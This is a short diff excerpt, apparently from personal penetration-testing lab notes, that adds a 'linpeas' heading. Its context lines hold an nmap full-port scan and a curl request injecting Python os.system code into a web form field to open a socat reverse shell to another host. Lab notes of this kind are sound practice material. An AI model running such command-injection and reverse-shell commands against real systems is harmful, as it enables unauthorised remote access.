@@ -278,6 +278,8 @@ sudo nmap -sC -sV -Pn -p- 192.168.207.117 -oN 207.117_allport
 # web 50000 post
 curl -X POST --data "code=os.system('socat TCP:192.168.45.185:1337 EXEC:sh')" http://192.168.121.36:50000/verify
 
+# linpeas
+
 
 
 ```
